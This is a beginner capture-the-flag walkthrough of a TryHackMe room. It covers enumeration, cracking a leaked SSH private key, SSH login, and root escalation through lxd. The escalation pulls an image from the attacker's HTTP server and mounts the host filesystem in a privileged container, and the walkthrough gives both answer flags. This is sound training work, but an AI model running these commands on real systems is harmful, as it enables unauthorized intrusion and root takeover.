# <div align="center">[Gaming Server](https://tryhackme.com/room/gamingserver)</div>
<div align="center">An Easy Boot2Root box for beginners</div>
<br>
<div align="center">
<img width="320" height="240" alt="image" src="https://github.com/user-attachments/assets/401b606c-40ed-406c-8632-71fff75d7af4" />
</div>

## Task 1. Gaming Server WalkThrough

Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

---

## Enumeration

* ```nmap -sC -sV <machineip>```

* ```gobuster dir -u http://<machineip>/ -w /home/kali/Desktop/wordlists/rockyou.txt```

<p align="center">
  <img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/6baa3a8f-a508-4829-a4a5-0a0382774a2a" />
</p>

While enumerating directories, we found an open directory:

<p align="center">
 <img width="940" height="527" alt="image" src="https://github.com/user-attachments/assets/1af4f3a2-acc1-44ea-88b8-f4ad9159fe4c" />
</p>

This directory contains:
- dict.lst  
- manifesto.txt  
- meme.jpg  

---

Found one more directory:
<p align="center">
  <img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/f0fdf00b-e610-46e8-a178-e8fe671d3f07" />
</p>

Inside `/secret`, we find RSA Key:

### secretKey
<p align="center">
  <img width="940" height="527" alt="image" src="https://github.com/user-attachments/assets/a17e9a52-e80f-4bae-af7f-447c6626570b" />
</p>

This reveals a **private key**, which can be used for further exploitation.

---

### Cracking the Private Key

* ```john --wordlists dict.list --format=SSH idkey.hash```

After cracking, we get the passphrase for the RSA private key.

* ```chmod 600 id_key```

---

### Initial Access (SSH)

* ```ssh -i id_key john@<machineip>```

Successfully logged in and gained user access.

<p align="center">
  <img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/08140636-8853-42e6-a186-73238f51b8b0" />
</p>

### What is the user flag?
```
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

* ```cat user.txt```

---

### Privilege Escalation
### Use id on the victim terminal
* ```id```

We observe that the user is part of the **lxd group**.

Being in the lxd group allows you to manipulate system containers and potentially escalate privileges to root.

Members of lxd can create privileged containers and mount the host filesystem into them.

---

## Exploiting LXD

### Step 1: Prepare Alpine Image (Attacker Machine i.e on my own kali linux)

* ```wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine```
* ```chmod +x build-alpine```
* ```./build-alpine```

---

### Step 2: Start Python HTTP Server (Attacker Machine i.e on my own kali linux)

* ```python3 -m http.server 8000```

---

<p align="center">
  <img width="940" height="245" alt="image" src="https://github.com/user-attachments/assets/8f4f28c2-5043-467a-84c5-332513ae674e" />
</p>

### Step 3: Download Image on Victim Machine

* ```wget http://<attacker-ip i.e of my kali linux>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz```

---

### Step 4: Exploit LXD

Run the following commands on the victim machine:

* ```lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage```
* ```lxc init myimage ignite -c security.privileged=true```
* ```lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true```
* ```lxc start ignite```
* ```lxc exec ignite /bin/sh```

Now we have a shell inside the container with access to the host filesystem.

---

### Access Root Filesystem

* ```cd /mnt/root```
* ```cd root```
* ```ls```
* ```cat root.txt```

<p align="center">
  <img width="940" height="529" alt="image" src="https://github.com/user-attachments/assets/b2fd44e0-7d85-4fe6-a8d8-4d4f7e4697c2" />
</p>

### What is the root flag?
```
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

Completed Room
